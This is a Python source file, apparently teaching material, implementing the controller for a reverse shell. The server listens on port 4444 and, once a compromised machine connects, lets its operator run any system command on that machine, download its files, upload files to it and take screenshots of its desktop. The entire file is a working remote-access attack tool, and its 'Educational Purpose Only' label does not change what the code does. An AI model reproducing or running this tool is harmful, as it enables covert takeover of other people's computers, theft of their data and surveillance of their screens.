#!/usr/bin/env python3
"""
Reverse Shell Server - Command & Control
By Inlighn Tech
Educational Purpose Only
"""

import socket
import json
import os
import sys
import time
import base64
import threading
import struct
from datetime import datetime
from typing import Optional, Dict, Any

class ReverseShellServer:
    """Command and Control Server for Reverse Shell"""
    
    def __init__(self, host: str = '0.0.0.0', port: int = 4444):
        self.host = host
        self.port = port
        self.client = None
        self.client_address = None
        self.connected = False
        self.buffer_size = 4096
        
    def start_server(self) -> None:
        """Start listening for incoming connections"""
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((self.host, self.port))
            server.listen(1)
            
            print(f"[*] Listening on {self.host}:{self.port}")
            print("[*] Waiting for incoming connection...")
            
            self.client, self.client_address = server.accept()
            self.connected = True
            print(f"[+] Connection established from {self.client_address[0]}:{self.client_address[1]}")
            print("[+] Type 'help' for available commands\n")
            
            self.shell_loop()
            
        except KeyboardInterrupt:
            print("\n[!] Server terminated by user")
            sys.exit(0)
        except Exception as e:
            print(f"[!] Error: {e}")
            sys.exit(1)
        finally:
            if self.client:
                self.client.close()
    
    def shell_loop(self) -> None:
        """Main command loop"""
        while self.connected:
            try:
                # Get command from user
                command = input("shell> ")
                
                if not command:
                    continue
                
                # Process special commands
                if command.lower() == 'exit':
                    self.send_command('exit')
                    self.connected = False
                    break
                elif command.lower() == 'help':
                    self.show_help()
                    continue
                elif command.lower().startswith('download '):
                    self.download_file(command[9:])
                    continue
                elif command.lower().startswith('upload '):
                    self.upload_file(command[7:])
                    continue
                elif command.lower().startswith('screenshot'):
                    self.take_screenshot()
                    continue
                
                # Send command to client
                result = self.send_command(command)
                if result:
                    print(result)
                else:
                    print("[!] No response received")
                    
            except KeyboardInterrupt:
                print("\n[!] Interrupted. Type 'exit' to quit")
                continue
            except Exception as e:
                print(f"[!] Error: {e}")
                self.connected = False
                break
    
    def send_command(self, command: str) -> Optional[str]:
        """Send command to client and receive response"""
        if not self.client:
            return None
            
        try:
            # Send command
            self.client.send(json.dumps({'command': command}).encode())
            
            # Receive response with length prefix
            raw_length = self.client.recv(8)
            if not raw_length:
                return None
                
            length = struct.unpack('>Q', raw_length)[0]
            
            # Receive data in chunks
            data = b''
            while len(data) < length:
                chunk = self.client.recv(min(self.buffer_size, length - len(data)))
                if not chunk:
                    break
                data += chunk
            
            if not data:
                return None
                
            response = json.loads(data.decode())
            
            if response['status'] == 'success':
                return response['output']
            else:
                return f"[!] Error: {response['output']}"
                
        except (socket.error, json.JSONDecodeError) as e:
            print(f"[!] Connection error: {e}")
            self.connected = False
            return None
    
    def download_file(self, remote_path: str) -> None:
        """Download a file from the client"""
        try:
            print(f"[*] Downloading {remote_path} from client...")
            
            # Get filename from path
            local_path = os.path.basename(remote_path)
            if not local_path:
                local_path = 'downloaded_file'
            
            # Send download command
            self.client.send(json.dumps({
                'command': f'download {remote_path}'
            }).encode())
            
            # Receive response with length prefix
            raw_length = self.client.recv(8)
            if not raw_length:
                print("[!] No response received")
                return
                
            length = struct.unpack('>Q', raw_length)[0]
            
            # Receive file data
            data = b''
            while len(data) < length:
                chunk = self.client.recv(min(self.buffer_size, length - len(data)))
                if not chunk:
                    break
                data += chunk
            
            if not data:
                print("[!] No file data received")
                return
                
            response = json.loads(data.decode())
            
            if response['status'] == 'success':
                # Decode and save file
                file_data = base64.b64decode(response['data'])
                with open(local_path, 'wb') as f:
                    f.write(file_data)
                print(f"[+] File downloaded successfully: {local_path}")
                print(f"[+] Size: {len(file_data)} bytes")
            else:
                print(f"[!] Error: {response['output']}")
                
        except Exception as e:
            print(f"[!] Download error: {e}")
    
    def upload_file(self, local_path: str) -> None:
        """Upload a file to the client"""
        try:
            if not os.path.exists(local_path):
                print(f"[!] File not found: {local_path}")
                return
            
            # Read and encode file
            with open(local_path, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            
            remote_path = os.path.basename(local_path)
            print(f"[*] Uploading {local_path} to client as {remote_path}...")
            
            # Send upload command with file data
            self.client.send(json.dumps({
                'command': f'upload {remote_path}',
                'data': file_data
            }).encode())
            
            # Receive response with length prefix
            raw_length = self.client.recv(8)
            if not raw_length:
                print("[!] No response received")
                return
                
            length = struct.unpack('>Q', raw_length)[0]
            
            data = b''
            while len(data) < length:
                chunk = self.client.recv(min(self.buffer_size, length - len(data)))
                if not chunk:
                    break
                data += chunk
            
            if not data:
                print("[!] No response received")
                return
                
            response = json.loads(data.decode())
            
            if response['status'] == 'success':
                print(f"[+] File uploaded successfully: {remote_path}")
            else:
                print(f"[!] Error: {response['output']}")
                
        except Exception as e:
            print(f"[!] Upload error: {e}")
    
    def take_screenshot(self) -> None:
        """Take screenshot of client's desktop"""
        try:
            print("[*] Taking screenshot of client's desktop...")
            
            self.client.send(json.dumps({
                'command': 'screenshot'
            }).encode())
            
            # Receive response with length prefix
            raw_length = self.client.recv(8)
            if not raw_length:
                print("[!] No response received")
                return
                
            length = struct.unpack('>Q', raw_length)[0]
            
            data = b''
            while len(data) < length:
                chunk = self.client.recv(min(self.buffer_size, length - len(data)))
                if not chunk:
                    break
                data += chunk
            
            if not data:
                print("[!] No data received")
                return
                
            response = json.loads(data.decode())
            
            if response['status'] == 'success':
                # Decode and save screenshot
                screenshot_data = base64.b64decode(response['data'])
                filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                with open(filename, 'wb') as f:
                    f.write(screenshot_data)
                print(f"[+] Screenshot saved: {filename}")
                print(f"[+] Size: {len(screenshot_data)} bytes")
            else:
                print(f"[!] Error: {response['output']}")
                
        except Exception as e:
            print(f"[!] Screenshot error: {e}")
    
    def show_help(self) -> None:
        """Display help information"""
        help_text = """
╔══════════════════════════════════════════════════════════════╗
║                    REVERSE SHELL COMMANDS                    ║
╠══════════════════════════════════════════════════════════════╣
║  <command>     Execute any system command                   ║
║  cd <dir>      Change directory                             ║
║  download <file>  Download file from client                 ║
║  upload <file>    Upload file to client                     ║
║  screenshot     Take screenshot of client desktop           ║
║  help           Show this help menu                         ║
║  exit           Terminate session                           ║
╚══════════════════════════════════════════════════════════════╝
"""
        print(help_text)

def main():
    """Main function"""
    print("=" * 60)
    print("REVERSE SHELL - Command & Control Server")
    print("By Inlighn Tech")
    print("=" * 60)
    
    # Parse command line arguments
    host = '0.0.0.0'
    port = 4444
    
    if len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
        except ValueError:
            print("[!] Invalid port number. Using default port 4444")
    
    if len(sys.argv) > 2:
        host = sys.argv[2]
    
    server = ReverseShellServer(host, port)
    server.start_server()

if __name__ == "__main__":
    main()